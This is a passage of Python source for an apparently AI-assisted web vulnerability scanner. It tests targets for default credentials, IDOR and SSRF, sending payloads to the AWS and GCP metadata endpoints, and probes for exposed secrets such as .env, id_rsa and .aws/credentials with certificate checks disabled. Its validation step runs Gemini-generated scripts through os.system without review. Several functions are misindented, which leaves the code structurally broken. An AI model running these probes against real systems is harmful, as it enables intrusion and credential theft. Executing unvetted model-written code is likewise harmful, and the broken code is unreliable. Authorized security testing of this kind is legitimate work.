                # Check for successful login indicators (e.g., redirect to dashboard, specific success message)
                # This is highly dependent on the target application
                if "welcome" in response.text.lower() or "dashboard" in response.url.lower():
                    finding = {
                        'type': 'default_credentials',
                        'severity': 'critical',
                        'confidence': 0.95,
                        'target': target,
                        'description': f'Application is vulnerable to default credentials: {username}/{password}',
                        'evidence': f'Successful login with default credentials: {username}/{password}',
                        'poc': f'Login to {login_url} with username "{username}" and password "{password}"'
                    }
                    findings.append(finding)
                    self.logger.warning(f"Default credentials found: {username}/{password} on {target}")
                    # If one set of default credentials works, we can stop here or continue to find more
                    # For now, let's continue to find all default credentials
                else:
                    self.logger.info(f"Login failed for {username}/{password}")

            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error during authentication test for {target} with {username}/{password}: {e}")
            except Exception as e:
                self.logger.error(f"An unexpected error occurred during authentication test: {e}")
        
        if not findings:
            self.logger.info(f"No default credentials found for {target}.")
        
        return findings
    def test_idor(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test IDOR vulnerabilities by attempting to access resources with modified IDs."""
        self.logger.info(f"Testing IDOR on {target}.")
        findings = []

        # This is a generic approach and needs to be adapted to the specific target application.
        # It assumes a URL structure like /resource/{id} or /api/v1/users/{id}
        # The 'target' parameter should ideally be a URL that contains an ID, e.g., https://example.com/users/123
        
        parsed_url = urlparse(target)
        path_segments = parsed_url.path.split('/')
        
        # Try to find a numeric ID in the path
        try:
            original_id_index = -1
            original_id = -1
            for i, segment in enumerate(path_segments):
                if segment.isdigit():
                    original_id = int(segment)
                    original_id_index = i
                    break
            
            if original_id_index != -1:
                self.logger.info(f"Found potential ID: {original_id} at segment index {original_id_index}")
                
                # Test with a decremented ID
                modified_id = original_id - 1
                if modified_id >= 0: # Ensure ID doesn't go negative
                    modified_path_segments = list(path_segments)
                    modified_path_segments[original_id_index] = str(modified_id)
                    modified_path = '/'.join(modified_path_segments)
                    modified_url = parsed_url._replace(path=modified_path).geturl()
                    
                    self.logger.info(f"Testing IDOR with modified URL: {modified_url}")
                    response = self.session.get(modified_url, timeout=10, verify=False)
                    
                    # A successful response (e.g., 200 OK) might indicate IDOR
                    # This check needs to be more sophisticated in a real scenario (e.g., checking content for unauthorized data)
                    if response.status_code == 200 and "access denied" not in response.text.lower():
                        finding = {
                            'type': 'idor',
                            'severity': 'high',
                            'confidence': 0.85,
                            'target': target,
                            'description': f'Potential IDOR vulnerability: Able to access resource {modified_id} by modifying ID from {original_id}.',
                            'evidence': f'Accessed {modified_url} successfully.',
                            'poc': f'Access {modified_url} without proper authorization.'
                        }
                        findings.append(finding)
                        self.logger.warning(f"Potential IDOR found: {modified_url}")
                
                # Test with an incremented ID
                modified_id = original_id + 1
                modified_path_segments = list(path_segments)
                modified_path_segments[original_id_index] = str(modified_id)
                modified_path = '/'.join(modified_path_segments)
                modified_url = parsed_url._replace(path=modified_path).geturl()
                
                self.logger.info(f"Testing IDOR with modified URL: {modified_url}")
                response = self.session.get(modified_url, timeout=10, verify=False)
                
                if response.status_code == 200 and "access denied" not in response.text.lower():
                    finding = {
                        'type': 'idor',
                        'severity': 'high',
                        'confidence': 0.85,
                        'target': target,
                        'description': f'Potential IDOR vulnerability: Able to access resource {modified_id} by modifying ID from {original_id}.',
                        'evidence': f'Accessed {modified_url} successfully.',
                            'poc': f'Access {modified_url} without proper authorization.'
                    }
                    findings.append(finding)
                    self.logger.warning(f"Potential IDOR found: {modified_url}")

            else:
                self.logger.info(f"No numeric ID found in the path of {target}. Skipping IDOR test.")

        except Exception as e:
            self.logger.error(f"Error during IDOR test for {target}: {e}")
        
        if not findings:
            self.logger.info(f"No IDOR vulnerabilities found for {target}.")
        
        return findings

    def test_ssrf(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities."""
        self.logger.info(f"Testing SSRF on {target}.")
        findings = []

        # Common internal IP addresses and domains to test for SSRF
        internal_targets = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata service
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # GCP metadata service
        ]

        # Assuming the 'target' URL has a parameter that can be manipulated to trigger SSRF
        # This is a generic example and would need to be adapted to the specific target's vulnerable parameter
        # For example, if the target is https://example.com/image?url=...
        
        parsed_target_url = urlparse(target)
        
        # Try to find a parameter that might be vulnerable to SSRF
        # This is a very basic heuristic and would need more sophisticated analysis in a real scenario
        vulnerable_param_candidates = ["url", "image", "src", "link", "file"]
        
        vulnerable_param = None
        for param in vulnerable_param_candidates:
            if param in parsed_target_url.query:
                vulnerable_param = param
                break
        
        if not vulnerable_param:
            self.logger.info(f"No obvious vulnerable parameter found in {target} for SSRF testing. Skipping.")
            return findings

        for internal_target in internal_targets:
            self.logger.info(f"Attempting SSRF with internal target: {internal_target}")
            try:
                # Construct the URL with the internal target as the parameter value
                # This assumes the parameter is in the query string
                new_query = re.sub(f"{vulnerable_param}=[^&]*", f"{vulnerable_param}={quote(internal_target)}", parsed_target_url.query)
                ssrf_test_url = parsed_target_url._replace(query=new_query).geturl()

                response = self.session.get(ssrf_test_url, timeout=10, verify=False)

                # Look for indicators of SSRF (e.g., content from the internal target, specific error messages)
                # This is highly dependent on the internal service and how the application handles the response
                if "root:x:0:0" in response.text or "access-configs" in response.text or "instance-id" in response.text:
                    finding = {
                        'type': 'ssrf',
                        'severity': 'critical',
                        'confidence': 0.90,
                        'target': target,
                        'description': f'Server-Side Request Forgery (SSRF) vulnerability detected. Server accessed internal resource: {internal_target}',
                        'evidence': f'Response contained content from {internal_target}',
                        'poc': f'Manipulate {vulnerable_param} parameter to {internal_target}'
                    }
                    findings.append(finding)
                    self.logger.warning(f"SSRF vulnerability found: {ssrf_test_url}")
                else:
                    self.logger.info(f"SSRF test to {internal_target} did not yield expected results.")

            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error during SSRF test for {target} with {internal_target}: {e}")
            except Exception as e:
                self.logger.error(f"An unexpected error occurred during SSRF test: {e}")
        
        if not findings:
            self.logger.info(f"No SSRF vulnerabilities found for {target}.")
        
        return findings

    def test_security_misconfiguration(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test for common security misconfigurations, such as missing security headers."""
        self.logger.info(f"Testing security misconfigurations on {target}.")
        findings = []

        try:
            response = self.session.get(target, timeout=10, verify=False)
            headers = response.headers

            # Check for missing security headers
            security_headers = {
                "Strict-Transport-Security": "HSTS header missing. This helps protect against man-in-the-middle attacks.",
                "X-Frame-Options": "X-Frame-Options header missing. This helps protect against clickjacking attacks.",
                "X-Content-Type-Options": "X-Content-Type-Options header missing. This helps protect against MIME type sniffing vulnerabilities.",
                "Content-Security-Policy": "Content-Security-Policy header missing. This helps protect against XSS and data injection attacks.",
                "X-XSS-Protection": "X-XSS-Protection header missing or insecurely configured. This helps protect against some XSS attacks.",
            }

            for header, description in security_headers.items():
                if header not in headers:
                    finding = {
                        'type': 'security_misconfiguration',
                        'severity': 'medium',
                        'confidence': 0.80,
                        'target': target,
                        'description': f'Missing security header: {header}. {description}',
                        'evidence': f'Header {header} not found in response.',
                        'poc': f'Inspect response headers for {target}'
                    }
                    findings.append(finding)
                    self.logger.warning(f"Missing security header: {header} on {target}")
                elif header == "X-XSS-Protection" and "0" in headers[header]:
                    finding = {
                        'type': 'security_misconfiguration',
                        'severity': 'low',
                        'confidence': 0.70,
                        'target': target,
                        'description': f'Insecure X-XSS-Protection header: {headers[header]}. This header is disabled.',
                        'evidence': f'X-XSS-Protection header set to {headers[header]}',
                        'poc': f'Inspect response headers for {target}'
                    }
                    findings.append(finding)
                    self.logger.warning(f"Insecure X-XSS-Protection header on {target}")

        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error during security misconfiguration test for {target}: {e}")
        except Exception as e:
            self.logger.error(f"An unexpected error occurred during security misconfiguration test: {e}")
        
        if not findings:
            self.logger.info(f"No significant security misconfigurations found for {target}.")
        
        return findings

    def test_cryptographic_failures(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test for cryptographic failures, specifically sensitive data exposure through common file types."""
        self.logger.info(f"Testing for cryptographic failures (sensitive data exposure) on {target}.")
        findings = []

        # Common sensitive file extensions and paths to check
        sensitive_paths = [
            ".env",
            "config.json",
            "settings.py",
            "web.config",
            "database.yml",
            "credentials.xml",
            "id_rsa", # Private SSH key
            "id_rsa.pub", # Public SSH key
            ".git/config",
            ".aws/credentials",
            "wp-config.php", # WordPress configuration
            "admin/", # Common admin panel path
            "backup.zip",
            "backup.tar.gz",
            "dump.sql",
        ]

        for path in sensitive_paths:
            test_url = urljoin(target, path)
            self.logger.info(f"Checking for sensitive file: {test_url}")
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                # Look for 200 OK and content that might indicate sensitive information
                if response.status_code == 200 and len(response.text) > 0:
                    # Further analysis of content could be done here to increase confidence
                    # For now, a 200 OK on a sensitive path is considered a finding
                    finding = {
                        'type': 'cryptographic_failure',
                        'severity': 'high',
                        'confidence': 0.85,
                        'target': test_url,
                        'description': f'Potential sensitive data exposure: Accessible file/directory {path}',
                        'evidence': f'Accessed {test_url} successfully with status {response.status_code}',
                        'poc': f'Access {test_url} directly to view sensitive information.'
                    }
                    findings.append(finding)
                    self.logger.warning(f"Sensitive file/directory found: {test_url}")
                else:
                    self.logger.info(f"Sensitive file/directory {test_url} not found or not accessible.")

            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error during cryptographic failures test for {test_url}: {e}")
            except Exception as e:
                self.logger.error(f"An unexpected error occurred during cryptographic failures test: {e}")
        
        if not findings:
            self.logger.info(f"No significant cryptographic failures (sensitive data exposure) found for {target}.")
        
        return findings

    def test_logging_monitoring(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Placeholder for testing security logging and monitoring failures."""
        self.logger.info(f"Testing security logging and monitoring for {target}. This requires manual review.")
        findings = []

        # Automated detection of logging and monitoring failures is complex and often requires
        # access to internal systems, logs, or specific API endpoints.
        # This function serves as a placeholder to highlight the importance of this OWASP category.

        # Example of a potential finding (manual review needed):
        finding = {
            'type': 'logging_monitoring_failure',
            'severity': 'low',
            'confidence': 0.10, # Low confidence as it's a placeholder for manual review
            'target': target,
            'description': 'Security Logging and Monitoring requires manual review. Ensure all security-relevant events are logged, logs are protected, and effective monitoring and alerting are in place.',
            'evidence': 'Automated checks are insufficient for this category. Manual review of logging configurations, log retention policies, and monitoring systems is recommended.',
            'poc': 'Manual review of application and infrastructure logging and monitoring configurations.'
        }
        findings.append(finding)
        self.logger.info(f"Placeholder finding for Logging and Monitoring added for {target}.")
        
        return findings

    def test_insecure_design(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test for Insecure Design vulnerabilities, including basic rate limiting checks."""
        self.logger.info(f"Testing for Insecure Design on {target}. This includes checking for rate limiting.")
        findings = []

        # --- Basic Rate Limiting Check ---
        self.logger.info(f"Performing basic rate limiting check on {target}...")
        num_requests = 10
        request_interval = 0.1 # seconds
        response_times = []
        status_codes = []

        for _ in range(num_requests):
            try:
                start_time = time.time()
                response = self.session.get(target, timeout=5, verify=False)
                end_time = time.time()
                response_times.append(end_time - start_time)
                status_codes.append(response.status_code)
                time.sleep(request_interval)
            except requests.exceptions.RequestException as e:
                self.logger.warning(f"Request failed during rate limiting test: {e}")
                status_codes.append(0) # Indicate a failed request
            except Exception as e:
                self.logger.error(f"An unexpected error occurred during rate limiting test: {e}")
                status_codes.append(0)

        # Analyze results for signs of rate limiting
        # A simple heuristic: if all requests succeed quickly, and no 429/503, rate limiting might be absent or weak.
        # This is a very basic check and can be easily bypassed or be a false positive/negative.
        if all(code == 200 for code in status_codes) and all(t < 1.0 for t in response_times):
            # If no 429 (Too Many Requests) or 503 (Service Unavailable) and all requests are fast
            if 429 not in status_codes and 503 not in status_codes:
                finding = {
                    'type': 'insecure_design_rate_limiting',
                    'severity': 'medium',
                    'confidence': 0.60,
                    'target': target,
                    'description': 'Potential lack of or weak rate limiting detected. Multiple requests were processed without apparent throttling or blocking.',
                    'evidence': f'Sent {num_requests} requests with average response time {sum(response_times)/len(response_times):.2f}s. All returned 200 OK.',
                    'poc': 'Attempt to brute-force or abuse endpoints without rate limits.'
                }
                findings.append(finding)
                self.logger.warning(f"Potential rate limiting issue found on {target}.")
        else:
            self.logger.info(f"Rate limiting appears to be in place or other issues prevented a clear test on {target}.")

        # --- Other Insecure Design aspects (still require manual review) ---
        # Insecure Design is a broad category that encompasses architectural flaws,
        # lack of security controls by design, and improper threat modeling.
        # Automated detection is extremely challenging without deep knowledge of the application's
        # design and business logic. This function serves as a placeholder for these complex aspects.
        
        manual_review_finding = {
            'type': 'insecure_design_manual_review',
            'severity': 'low',
            'confidence': 0.10, # Low confidence as it's a placeholder for manual review
            'target': target,
            'description': 'Other Insecure Design aspects (e.g., architectural flaws, improper threat modeling) require manual review of application architecture, design patterns, and threat models. Automated tools can only provide limited insights.',
            'evidence': 'Automated checks are insufficient for these complex design issues. Manual review by security architects and developers is recommended.',
            'poc': 'Manual review of design documents, architectural diagrams, and code for design flaws.'
        }
        findings.append(manual_review_finding)
        self.logger.info(f"Placeholder finding for other Insecure Design aspects added for {target}.")
        
        return findings

    def test_data_integrity_failures(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Placeholder for testing Software and Data Integrity Failures."""
        self.logger.info(f"Testing for Software and Data Integrity Failures on {target}. This requires advanced analysis.")
        findings = []

        # Software and Data Integrity Failures can involve various issues like:
        # - Insecure deserialization
        # - Lack of integrity checks on critical updates or data
        # - CI/CD pipeline vulnerabilities
        # Automated detection is highly complex and often requires white-box analysis,
        # understanding of build processes, and runtime monitoring. This function serves as a placeholder.

        finding = {
            'type': 'data_integrity_failure',
            'severity': 'high',
            'confidence': 0.10, # Low confidence as it's a placeholder for manual review
            'target': target,
            'description': 'Software and Data Integrity Failures require advanced analysis of software update processes, critical data handling, and CI/CD pipelines. Automated tools can only provide limited insights.',
            'evidence': 'Automated checks are insufficient for this category. Manual review of software supply chain, data validation, and integrity controls is recommended.',
            'poc': 'Manual review of build processes, update mechanisms, and data serialization/deserialization.'
        }
        findings.append(finding)
        self.logger.info(f"Placeholder finding for Software and Data Integrity Failures added for {target}.")
        
        return findings

    def save_findings(self, findings: List[Dict[str, Any]]) -> None:
        """Save findings to output file"""
        output_file = os.path.join(self.workdir, 'ai_analysis.txt')
        poc_file = os.path.join(self.workdir, 'poc.txt')
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("AI-Powered Vulnerability Analysis Report\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Generated on: {datetime.now()}\n")
            f.write(f"Target: {self.workdir}\n\n")
            
            for i, finding in enumerate(findings, 1):
                f.write(f"Finding #{i}:\n")
                f.write(f"Type: {finding['type']}\n")
                f.write(f"Severity: {finding['severity']}\n")
                f.write(f"Confidence: {finding['confidence']}\n")
                f.write(f"Target: {finding['target']}\n")
                f.write(f"Description: {finding['description']}\n")
                f.write(f"Evidence: {finding['evidence']}\n")
                f.write(f"PoC: {finding['poc']}\n")
                f.write("-" * 50 + "\n\n")
        
        # Save only PoCs to separate file
        with open(poc_file, 'a', encoding='utf-8') as f:
            f.write("\nAI-Generated Proof of Concepts:\n")
            f.write("=" * 50 + "\n\n")
            for finding in findings:
                if finding['severity'] in ['high', 'critical']:
                    f.write(f"Target: {finding['target']}\n")
                    f.write(f"Vulnerability: {finding['type']}\n")
                    f.write(f"PoC: {finding['poc']}\n")
                    f.write("-" * 30 + "\n")

    def save_findings_html(self, findings: List[Dict[str, Any]]) -> None:
        """Save findings to HTML report."""
        self.logger.info("Generating HTML report...")
        self.generate_charts(findings)

        narrative = ""
        if self.gemini_model:
            try:
                prompt = f"""Generate a narrative for a vulnerability assessment report. The report should be easy to understand for non-technical users. The findings are as follows:

{json.dumps(findings, indent=2)}

Provide a summary of the findings, an overview of the risks, and a conclusion.
"""
                response = self.gemini_model.generate_content(prompt)
                narrative = response.text
            except Exception as e:
                self.logger.error(f"Failed to generate report narrative: {e}")

        output_file = os.path.join(self.workdir, 'ai_analysis.html')
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
<title>AI-Powered Vulnerability Analysis Report</title>
<style>
body { font-family: sans-serif; }
.container { max-width: 800px; margin: 0 auto; padding: 20px; }
.finding { border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; }
.finding h2 { margin-top: 0; }
.finding .severity-critical { color: red; }
.finding .severity-high { color: orange; }
.finding .severity-medium { color: yellow; }
.finding .severity-low { color: green; }
.chart { max-width: 100%; height: auto; }
</style>
</head>
<body>
<div class="container">
<h1>AI-Powered Vulnerability Analysis Report</h1>
""")
            f.write(f"<p>Generated on: {datetime.now()}</p>")
            f.write(f"<p>Target: {self.workdir}</p>")

            if narrative:
                f.write("<h2>Executive Summary</h2>")
                f.write(f"<p>{narrative}</p>")

            f.write("<h2>Vulnerability Overview</h2>")
            f.write('<img src="severity_chart.png" alt="Vulnerabilities by Severity" class="chart">')
            f.write('<img src="type_chart.png" alt="Vulnerabilities by Type" class="chart">')

            f.write("<h2>Findings</h2>")
            for i, finding in enumerate(findings, 1):
                f.write(f"""<div class="finding">
<h2>Finding #{i}: {finding['type']}</h2>
<p><strong>Severity:</strong> <span class="severity-{finding['severity']}">{finding['severity']}</span></p>
<p><strong>Confidence:</strong> {finding['confidence']}</p>
<p><strong>Target:</strong> {finding['target']}</p>
<p><strong>Description:</strong> {finding['description']}</p>
<p><strong>Evidence:</strong> {finding['evidence']}</p>
<p><strong>PoC:</strong><pre>{finding.get('poc', '')}</pre></p>
<p><strong>Validated:</strong> {finding.get('validated', False)} (Confidence: {finding.get('validation_confidence', 0.0)})</p>
<p><strong>Recommendation:</strong> {finding.get('recommendation', '')}</p>
</div>""")

            f.write("""</div>
</body>
</html>""")
        self.logger.info(f"HTML report saved to {output_file}")

    def generate_charts(self, findings: List[Dict[str, Any]]) -> None:
        """Generate charts to visualize the findings."""
        severities = [f.get('severity', 'unknown') for f in findings]
        types = [f.get('type', 'unknown') for f in findings]

        # Pie chart of severities
        severity_counts = {s: severities.count(s) for s in set(severities)}
        plt.figure(figsize=(8, 8))
        plt.pie(severity_counts.values(), labels=severity_counts.keys(), autopct='%1.1f%%')
        plt.title('Vulnerabilities by Severity')
        plt.savefig(os.path.join(self.workdir, 'severity_chart.png'))

        # Bar chart of types
        type_counts = {t: types.count(t) for t in set(types)}
        plt.figure(figsize=(12, 6))
        plt.bar(type_counts.keys(), type_counts.values())
        plt.xticks(rotation=45, ha='right')
        plt.title('Vulnerabilities by Type')
        plt.tight_layout()
        plt.savefig(os.path.join(self.workdir, 'type_chart.png'))

def auto_pattern_learning(self, urls: List[str]) -> List[str]:
        """Belajar pola baru dari URL yang sering muncul dan anomali"""
        patterns = set()
        for url in urls:
            parsed = urlparse(url)
            path = parsed.path
            if path.count('/') > 2:
                patterns.add(re.sub(r'\d+', '{id}', path))
            if re.search(r'[A-Za-z0-9]{32,}', url):
                patterns.add('possible_token_or_hash')
        return list(patterns)

def auto_scoring(self, finding: Dict[str, Any]) -> float:
        """Menilai risiko secara otomatis berdasarkan pola dan frekuensi, dengan bantuan Gemini untuk penilaian kontekstual."""
        if self.gemini_model:
            try:
                # Provide more context to Gemini for a better risk assessment
                prompt = f"""Assess the risk of the following vulnerability finding on a scale of 0.0 to 1.0, where 1.0 is the highest risk. Consider the vulnerability type, description, target, and any available evidence. Provide a single floating-point number (e.g., 0.75) followed by a brief justification.

Vulnerability Details:
Type: {finding.get('type')}
Description: {finding.get('description')}
Target: {finding.get('target')}
Severity (initial assessment): {finding.get('severity', 'unknown')}
Confidence (initial assessment): {finding.get('confidence', 0.0)}
Evidence: {finding.get('evidence', 'No specific evidence provided.')}
PoC: {finding.get('poc', 'No specific PoC provided.')}

Based on this information, what is the risk score (0.0-1.0) and why?
"""
                response = self.gemini_model.generate_content(prompt)
                # Extract the score from the response
                score_match = re.search(r'(\d\.\d+)', response.text)
                if score_match:
                    self.logger.info(f"Gemini scored finding {finding.get('type')} on {finding.get('target')}: {response.text}")
                    return float(score_match.group(1))
            except Exception as e:
                self.logger.error(f"Gemini scoring failed: {e}. Falling back to rule-based scoring.")

        # Fallback to rule-based scoring
        score = 0.5
        if finding.get('severity') == 'critical':
            score += 0.3
        if finding.get('correlated_count', 0) > 2:
            score += 0.1
        if finding.get('pattern') == 'possible_token_or_hash':
            score += 0.1
        if finding.get('type') in ['rce', 'subdomain_takeover']:
            score += 0.2
        return min(score, 1.0)

def auto_recommendation(self, finding: Dict[str, Any]) -> str:
        """Memberikan saran mitigasi otomatis berdasarkan tipe temuan, dengan bantuan Gemini untuk rekomendasi kontekstual."""
        if self.gemini_model:
            try:
                # Provide more context to Gemini for better recommendations
                prompt = f"""Provide a detailed and actionable mitigation recommendation for the following vulnerability finding. Consider the vulnerability type, description, target, severity, and any available evidence or PoC. Focus on practical steps that a developer or system administrator can take.

Vulnerability Details:
Type: {finding.get('type')}
Description: {finding.get('description')}
Target: {finding.get('target')}
Severity: {finding.get('severity', 'unknown')}
Confidence: {finding.get('confidence', 0.0)}
Evidence: {finding.get('evidence', 'No specific evidence provided.')}
PoC: {finding.get('poc', 'No specific PoC provided.')}
Risk Score: {finding.get('risk_score', 'N/A')}

What are the specific steps to mitigate this vulnerability?
"""
                response = self.gemini_model.generate_content(prompt)
                recommendation_text = response.text.strip()
                if recommendation_text:
                    self.logger.info(f"Gemini generated recommendation for {finding.get('type')} on {finding.get('target')}.")
                    return recommendation_text
                else:
                    self.logger.warning(f"Gemini generated an empty recommendation for {finding.get('type')} on {finding.get('target')}. Falling back to rule-based recommendations.")
            except Exception as e:
                self.logger.error(f"Gemini recommendation generation failed: {e}. Falling back to rule-based recommendations.")

        # Fallback to rule-based recommendations
        recommendations = {
            'sql_injection': 'Gunakan prepared statement dan validasi input.',
            'xss': 'Escape output dan gunakan Content Security Policy (CSP).',
            'lfi': 'Validasi path dan batasi akses file.',
            'rce': 'Sanitasi input dan batasi fungsi eksekusi.',
            'idor': 'Implementasi access control dan validasi otorisasi.',
            'subdomain_takeover': 'Hapus DNS record yang tidak digunakan.',
            'information_disclosure': 'Hapus data sensitif dari kode dan konfigurasi.',
            'javascript_vulnerability': 'Audit kode JS dan hindari eval/innerHTML.',
            'default_credentials': 'Ubah semua kredensial default menjadi kata sandi yang kuat dan unik.',
            'security_misconfiguration': 'Tinjau dan perbaiki konfigurasi keamanan server dan aplikasi, pastikan semua header keamanan diterapkan dengan benar.',
            'cryptographic_failure': 'Pastikan semua data sensitif dienkripsi dengan algoritma yang kuat dan kunci yang dikelola dengan baik. Hindari paparan file sensitif.',
            'ssrf': 'Validasi dan sanitasi semua input yang digunakan dalam permintaan sisi server untuk mencegah akses ke sumber daya internal.',
            'insecure_design_rate_limiting': 'Implementasikan pembatasan laju yang efektif pada semua endpoint yang rentan terhadap serangan brute-force atau enumerasi.',
            'logging_monitoring_failure': 'Tinjau dan perbaiki konfigurasi logging dan monitoring. Pastikan semua peristiwa keamanan dicatat dan dipantau secara aktif.',
            'data_integrity_failure': 'Tinjau proses pembaruan perangkat lunak dan mekanisme validasi integritas data. Pastikan deserialisasi aman dan data penting dilindungi dari modifikasi yang tidak sah.'
        }
        return recommendations.get(finding.get('type'), 'Audit dan perbaiki konfigurasi keamanan.')

def auto_chaining(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Deteksi kemungkinan eksploitasi berantai (chained attack)"""
        chains = []
        for f1 in findings:
            for f2 in findings:
                if f1 != f2 and f1.get('target') == f2.get('target'):
                    if f1.get('type') == 'idor' and f2.get('type') == 'rce':
                        chains.append({
                            'chain': ['idor', 'rce'],
                            'target': f1['target'],
                            'description': 'IDOR dapat digunakan untuk akses endpoint RCE.',
                            'severity': 'critical'
                        })
                    if f1.get('type') == 'lfi' and f2.get('type') == 'rce':
                        chains.append({
                            'chain': ['lfi', 'rce'],
                            'target': f1['target'],
                            'description': 'LFI dapat digunakan untuk eksekusi kode (RCE).',
                            'severity': 'critical'
                        })
        return chains

def auto_summary(self, findings: List[Dict[str, Any]]) -> str:
        """Membuat ringkasan otomatis dari semua temuan"""
        if self.gemini_model:
            try:
                prompt = f"Provide a concise summary of the following vulnerability findings:\n\n{json.dumps(findings, indent=2)}"
                response = self.gemini_model.generate_content(prompt)
                return response.text
            except Exception as e:
                self.logger.error(f"Gemini summary generation failed: {e}")

        # Fallback to rule-based summary
        summary = f"Total findings: {len(findings)}\n"
        types = {}
        for f in findings:
            types[f.get('type')] = types.get(f.get('type'), 0) + 1
        for t, count in types.items():
            summary += f"- {t}: {count}\n"
        criticals = [f for f in findings if f.get('severity') == 'critical']
        summary += f"Critical findings: {len(criticals)}\n"
        return summary

def validate_vulnerability(self, finding: Dict[str, Any]) -> tuple[bool, float]:
        """Validate a vulnerability using a Gemini-generated script."""
        if not self.gemini_model:
            return False, 0.0

        self.logger.info(f"Attempting to validate {finding['type']} at {finding['target']}")

        validation_attempts = 3
        successful_validations = 0

        for i in range(validation_attempts):
            try:
                prompt = f"""Generate a Python script to validate the following vulnerability. The script should return an exit code of 0 if the vulnerability is present, and 1 otherwise. The script should not require any external libraries that are not part of the standard Python library. Use a different validation technique than the previous attempts.

Vulnerability finding:
{json.dumps(finding, indent=2)}

Provide only the Python code in your response.
"""
                response = self.gemini_model.generate_content(prompt)
                validation_script = response.text

                # Clean up the script
                if validation_script.startswith('```python'):
                    validation_script = validation_script[9:]
                if validation_script.endswith('```'):
                    validation_script = validation_script[:-3]

                # Save the script to a file
                script_path = os.path.join(self.workdir, f'validation_script_{i}.py')
                with open(script_path, 'w') as f:
                    f.write(validation_script)

                # Execute the script
                exit_code = os.system(f"python {script_path}")

                if exit_code == 0:
                    successful_validations += 1

            except Exception as e:
                self.logger.error(f"Vulnerability validation attempt {i+1} failed: {e}")

        confidence = successful_validations / validation_attempts
        if confidence > 0.5:
            self.logger.info(f"Vulnerability validated with confidence: {confidence}")
            return True, confidence
        else:
            self.logger.info(f"Vulnerability not validated.")
            return False, confidence

def auto_correlation(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Menghubungkan temuan yang mirip berdasarkan target dan tipe"""
        correlated = []
        seen = set()
        for f in findings:
            key = f"{f.get('type')}-{f.get('target')}"
            if key not in seen:
                similar = [g for g in findings if g.get('type') == f.get('type') and g.get('target') == f.get('target')]
                if len(similar) > 1:
                    f['correlated_count'] = len(similar)
                    f['correlated_targets'] = [g.get('target') for g in similar]
                correlated.append(f)
                seen.add(key)
        return correlated

def run(self, html_report: bool = False) -> None:
        self.logger.info("Starting advanced AI-powered vulnerability analysis...")
        findings = self.analyze_target()
        # Pattern learning
        urls_file = os.path.join(self.workdir, 'all-urls.txt')
        if os.path.exists(urls_file):
            with open(urls_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            learned_patterns = self.auto_pattern_learning(urls)
            for pattern in learned_patterns:
                findings.append({
                    'type': 'pattern_learning',
                    'severity': 'medium',
                    'confidence': 0.7,
                    'target': 'multiple',
                    'description': f'Pattern learned: {pattern}',
                    'evidence': f'Pattern found in URLs',
                    'poc': f'Investigate URLs with pattern: {pattern}'
                })
        # Chaining
        chains = self.auto_chaining(findings)
        for chain in chains:
            findings.append({
                'type': 'chained_attack',
                'severity': chain['severity'],
                'confidence': 0.95,
                'target': chain['target'],
                'description': chain['description'],
                'evidence': f'Chain: {chain["chain"]}',
                'poc': f'Exploit chain: {" -> ".join(chain["chain"])}'
            })
        # Correlation
        findings = self.auto_correlation(findings)
        # Scoring & recommendation
        for f in findings:
            f['risk_score'] = self.auto_scoring(f)
            f['recommendation'] = self.auto_recommendation(f)
            f['validated'], f['validation_confidence'] = self.validate_vulnerability(f)
        # Prioritize
        findings = sorted(findings, key=lambda x: (x['risk_score'], x['confidence']), reverse=True)
        # Save
        self.save_findings(findings)
        if html_report:
            self.save_findings_html(findings)
        with open(os.path.join(self.workdir, 'findings.json'), 'w', encoding='utf-8') as f:
            json.dump(findings, f, indent=2)
        # Export SARIF for interoperability
        try:
            sarif = self._to_sarif(findings)
            with open(os.path.join(self.workdir, 'findings.sarif'), 'w', encoding='utf-8') as f:
                json.dump(sarif, f, indent=2)
        except Exception as e:
            self.logger.warning(f"SARIF export failed: {e}")
        # Hash outputs for integrity
        try:
            hashes = {}
            for name in ['ai_analysis.txt', 'findings.json', 'summary.txt']:
                path = os.path.join(self.workdir, name)
                if os.path.exists(path):
                    with open(path, 'rb') as hf:
                        hashes[name] = hashlib.sha256(hf.read()).hexdigest()
            with open(os.path.join(self.workdir, 'artifacts.sha256.json'), 'w', encoding='utf-8') as hf:
                json.dump(hashes, hf, indent=2)
        except Exception as e:
            self.logger.warning(f"Hashing outputs failed: {e}")
        # Summary
        summary = self.auto_summary(findings)
        with open(os.path.join(self.workdir, 'summary.txt'), 'w', encoding='utf-8') as f:
            f.write(summary)
        self.logger.info(f"Analysis complete. Found {len(findings)} potential vulnerabilities.")
        self.logger.info(f"Results saved to ai_analysis.txt, findings.json, and summary.txt")

    def _to_sarif(self, findings: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Convert findings to SARIF minimal schema."""
        runs = [{
            "tool": {"driver": {"name": "AdvancedAIPOCGenerator"}},
            "results": []
        }]
        for fnd in findings:
            try:
                level = {
                    'critical': 'error',
                    'high': 'error',
                    'medium': 'warning',
                    'low': 'note',
                    'info': 'note'
                }.get(fnd.get('severity', 'info'), 'note')
                runs[0]["results"].append({
                    "ruleId": fnd.get('type', 'unknown'),
                    "level": level,
                    "message": {"text": fnd.get('description', '')},
                    "locations": [{
